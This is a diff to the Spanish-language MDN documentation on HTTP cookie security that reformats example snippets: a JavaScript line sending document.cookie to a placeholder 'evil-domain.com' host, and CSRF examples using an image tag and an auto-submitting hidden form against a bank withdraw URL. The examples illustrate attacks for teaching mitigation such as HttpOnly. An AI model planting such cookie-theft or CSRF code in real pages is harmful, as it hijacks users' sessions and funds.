@@ -141,7 +141,8 @@ Tenga en cuenta las cuestiones de seguridad en la siguiente sección [Seguridad]
 Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad {{Glossary("XSS")}} de la aplicación.
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 El atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acceso al valor de la cookie a través de JavaScript.
@@ -151,18 +152,21 @@ El atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acc
 [Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) menciona buenos ejemplos para {{Glossary("CSRF")}}. En este caso, alguien puede incluir una imagen que no es realmente una imagen (por ejemplo un chat o foro sin filtrar), que en lugar de esto es realmente una solicitud de tu banco para retirar tu dinero:
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img
+  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
 ```
 
 Ahora, si tu tienes una sesión iniciada en tu tu cuenta bancaria y las cookies permanecen siendo válidas (y no hay otra validación mas que esa), se realizará la transferencia desde tu cuenta tan pronto como se cargue el html que contiene la imagen. Para los endpoints que requieren una petición de tipo POST, se puede disparar un evento de tipo envío de formulario (posiblemente en un iframe invisible) cuando la página se carga:
 
 ```html
 <form action="https://bank.example.com/withdraw" method="POST">
-  <input type="hidden" name="account" value="bob">
-  <input type="hidden" name="amount" value="1000000">
-  <input type="hidden" name="for" value="mallory">
+  <input type="hidden" name="account" value="bob" />
+  <input type="hidden" name="amount" value="1000000" />
+  <input type="hidden" name="for" value="mallory" />
 </form>
-<script>window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }
+</script>
 ```
 
 Se presentan aquí algunas técnicas que se deberían usar para evitar que estas cosas ocurran:
